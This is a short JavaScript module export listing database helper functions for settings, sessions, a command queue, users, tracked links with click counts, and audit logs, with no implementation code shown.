export default {
    initDB,
    getSettings,
    updateSetting,
    getSession,
    getSessionsByIp,
    upsertSession,
    updateSessionAdmin,
    updateLastSeen,
    getAllSessions,
    deleteSession,
    queueCommand,
    getCommand,
    // Users
    createUser,
    updateUser,
    deleteUser,
    getUserById,
    getUserByUsername,
    getUserByCode,
    getAllUsers,
    // Links
    createLink,
    getLinks,
    getLinkByCode,
    incrementLinkClicks,
    incrementLinkSessions,
    // Audit
    logAudit,
    getAuditLogs,
    backfillDefaultLinks,
    deleteLink,
    updateLinkConfig
};
